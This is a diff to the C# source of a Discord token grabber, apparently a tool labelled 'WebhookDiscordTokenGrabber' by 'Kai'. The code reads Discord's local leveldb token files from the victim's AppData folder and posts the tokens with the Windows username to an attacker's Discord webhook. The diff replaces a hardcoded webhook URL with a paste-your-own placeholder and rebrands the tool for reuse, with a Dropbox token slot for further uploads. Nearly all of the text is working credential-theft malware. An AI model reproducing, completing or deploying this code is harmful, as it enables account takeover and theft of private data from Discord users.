@@ -23,11 +23,11 @@ namespace WebhookDiscordTokenGrabber
                     process.Kill();
                 }
             }
-            catch (Exception ex)
+            catch
             {
                 return;
             }
-            
+
         }
 
         public static string DropboxToken = "abcdefghijklmnopqrstuvwxyz"; // PASTE YOUR DROPBOX DEVELOPER APP TOKEN HERE. (GIVE THE APP FULL ACCESS TO YOUR DROPBOX!)
@@ -57,7 +57,7 @@ namespace WebhookDiscordTokenGrabber
 
             string uploadfile = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\writtenlogtoken.txt";
 
-            
+
 
             List<string> SearchForFile()
             {
@@ -134,15 +134,15 @@ namespace WebhookDiscordTokenGrabber
                 }
                 return ldbFiles;
             }
-            
+
         }
 
-        private static readonly string _hookUrl = "https://discordapp.com/api/webhooks/737793943919526000/f9ZnPGC8LeQfoAQkt3w5HUP5xTjXBXZiKB6weYL-O7Ccedj0o85sCjqkq1BWeZaUPoey";
+        private static readonly string _hookUrl = "abcdefghijklmnopqrstuvwxyz"; // PASTE YOUR WEBHOOK URL HERE
 
 
         public static void ReportTokens(/*List<string> tokenReport*/)
         {
-            if (File.Exists(System.IO.File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\writtenldbtoken.txt")))
+            try
             {
                 string writtenldbtoken = System.IO.File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\writtenldbtoken.txt");
 
@@ -161,12 +161,13 @@ namespace WebhookDiscordTokenGrabber
                 }
                 catch { }
             }
-            else
+            catch
             {
-                Console.WriteLine("ldb token does not exists");
+                Console.WriteLine("writtenldbtoken.txt is not found");
             }
-            
-            if (File.Exists(System.IO.File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\writtenlogtoken.txt")))
+
+
+            try
             {
                 string writtenlogtoken = System.IO.File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\writtenlogtoken.txt");
                 //.log upload
@@ -176,17 +177,17 @@ namespace WebhookDiscordTokenGrabber
                     Dictionary<string, string> contents = new Dictionary<string, string>
                     {
                         { "content", $"Token report for '{Environment.UserName}'\n\n{string.Join("\n", writtenlogtoken)}" },
-                        { "username", "Kai's Token Grabber" },
-                        { "avatar_url", "https://cdn.discordapp.com/attachments/737777108243316807/737788069192794122/kai_green_eye_and_contur.jpeg" }
+                        { "username", "WDTG by Kai" },
+                        { "avatar_url", "https://cdn.discordapp.com/attachments/737989668242456688/737989908324417607/wdtg_avatar.PNG" }
                     };
 
                     client.PostAsync(_hookUrl, new FormUrlEncodedContent(contents)).GetAwaiter().GetResult();
                 }
                 catch { }
             }
-            else
+            catch
             {
-                Console.WriteLine("log token does not exists");
+                Console.WriteLine("writtenlogtoken.txt is not found");
             }
         }
     }
